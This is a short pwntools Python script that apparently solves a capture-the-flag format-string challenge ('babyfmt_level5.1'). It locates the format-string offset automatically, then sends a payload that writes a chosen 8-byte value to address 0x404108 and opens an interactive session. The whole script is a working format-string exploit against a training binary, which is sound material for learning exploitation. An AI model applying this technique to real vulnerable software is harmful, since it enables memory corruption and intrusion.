from pwn import *

context.arch = 'amd64'

def exec_fmt(payload):
    p = process("/challenge/babyfmt_level5.1")
    p.recv()
    p.send(payload)
    result = p.recvall()
    print(result)
    return result

fmtstr = FmtStr(exec_fmt)
print("fmtstr offset: {}".format(fmtstr.offset))
padding = b"A" * fmtstr.padlen

p = process("/challenge/babyfmt_level5.1")
payload = padding + fmtstr_payload(fmtstr.offset, {0x404108: 0xF16B20E1113A5DD7}) # padlen = 2 -> bytes -= 4
print(payload)
p.send(payload)
p.interactive()